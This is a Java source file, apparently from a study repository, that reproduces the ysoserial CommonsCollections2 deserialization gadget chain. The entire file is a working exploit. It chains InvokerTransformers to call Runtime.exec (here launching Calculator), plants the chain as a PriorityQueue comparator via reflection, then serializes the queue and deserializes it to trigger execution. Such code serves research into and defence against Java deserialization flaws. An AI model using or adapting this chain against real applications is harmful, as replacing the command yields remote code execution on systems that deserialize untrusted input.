package org.su18.serialize.ysoserial.CommonCollections.CommonCollections2;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.su18.serialize.ysoserial.Utils.SerializeUtil;

import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * CommonsCollections 2
 *
 * @author su18
 */
public class CC2WithChain {

	public static void main(String[] args) throws Exception {

		// 初始化 Transformer
		ChainedTransformer chain = new ChainedTransformer(new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
				new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"}));

		TransformingComparator comparator = new TransformingComparator(chain);

		// 在初始化时不带入 comparator
		PriorityQueue<String> queue = new PriorityQueue<>(2);
		queue.add("1");
		queue.add("2");

		Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
		field.setAccessible(true);
		field.set(queue, comparator);

		SerializeUtil.writeObjectToFile(queue);
		SerializeUtil.readFileObject();
	}

}
